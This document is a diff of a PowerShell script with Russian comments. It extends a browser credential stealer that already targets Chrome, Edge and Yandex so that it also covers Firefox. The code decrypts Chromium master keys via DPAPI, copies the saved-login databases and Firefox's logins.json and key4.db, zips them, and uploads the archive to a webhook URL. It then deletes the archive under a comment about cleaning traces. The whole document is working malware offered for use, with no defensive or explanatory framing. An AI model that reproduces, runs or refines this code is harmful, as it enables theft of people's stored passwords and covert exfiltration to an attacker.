@@ -4,26 +4,24 @@ $tempDir = "$env:TEMP\sys_info_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 $logPath = "$tempDir\report.log"
 
-# Подгружаем сборку для работы с DPAPI
+# Подгружаем сборку для работы с DPAPI (нужно для Chromium)
 Add-Type -AssemblyName System.Security
 
-# Функция для логирования и дешифровки ключа
+# Функция для дешифровки ключа Chromium-браузеров
 function Get-Key($statePath, $label) {
     if (Test-Path $statePath) {
         try {
             $json = Get-Content $statePath -Raw | ConvertFrom-Json
             $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
             
-            # Дешифровка мастер-ключа
+            # Дешифровка мастер-ключа через системный DPAPI
             $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
             
-            # Используем кавычки и правильное обращение к переменной, чтобы не было ошибки ParserError
             $base64Key = [Convert]::ToBase64String($masterKey)
             $logLine = "[$($label)] Master Key: $($base64Key)"
             Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
             return $true
         } catch { 
-            # Безопасный вывод ошибки
             $errMsg = $_.Exception.Message
             $errLine = "[$($label)] Key Error: $($errMsg)"
             Out-File -FilePath $logPath -InputObject $errLine -Append -Encoding UTF8
@@ -33,7 +31,7 @@ function Get-Key($statePath, $label) {
     return $false
 }
 
-# Список целей: Chrome, Edge, Yandex
+# 1. СБОР ДАННЫХ CHROMIUM (Chrome, Edge, Yandex)
 $browsers = @(
     @{name="Chrome"; path="Google\Chrome\User Data"},
     @{name="Edge"; path="Microsoft\Edge\User Data"},
@@ -43,7 +41,6 @@ $browsers = @(
 foreach ($b in $browsers) {
     $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
     if (Test-Path $userDataPath) {
-        # Рекурсивный поиск всех файлов 'Login Data'
         $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
         foreach ($file in $foundFiles) {
             $profileName = $file.Directory.Name
@@ -51,14 +48,34 @@ foreach ($b in $browsers) {
             
             $label = "$($b.name)_$($profileName)"
             if (Get-Key $localState $label) {
-                # Копируем базу
                 Copy-Item $file.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
             }
         }
     }
 }
 
-# Если данные собраны — упаковываем и отправляем
+# 2. СБОР ДАННЫХ FIREFOX
+$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $ffPath) {
+    $ffProfiles = Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue
+    foreach ($profile in $ffProfiles) {
+        $label = "Firefox_$($profile.Name)"
+        $loginsJson = Join-Path $profile.FullName "logins.json"
+        $keyDb = Join-Path $profile.FullName "key4.db"
+        
+        # Если есть файл с логинами, забираем его и базу ключей
+        if (Test-Path $loginsJson) {
+            Copy-Item $loginsJson -Destination "$tempDir\$($label)_logins.json" -Force -ErrorAction SilentlyContinue
+            if (Test-Path $keyDb) {
+                Copy-Item $keyDb -Destination "$tempDir\$($label)_key4.db" -Force -ErrorAction SilentlyContinue
+            }
+            $logLine = "[$($label)] Found Firefox profile. Database and JSON copied."
+            Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
+        }
+    }
+}
+
+# 3. УПАКОВКА И ОТПРАВКА
 if ((Get-ChildItem $tempDir).Count -gt 1) {
     $zipPath = "$env:TEMP\data_$(Get-Random).zip"
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
@@ -68,6 +85,7 @@ if ((Get-ChildItem $tempDir).Count -gt 1) {
         $wc.UploadFile($webhookUrl, "POST", $zipPath) | Out-Null
     } catch {}
     
+    # Очистка следов
     if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
 }
 
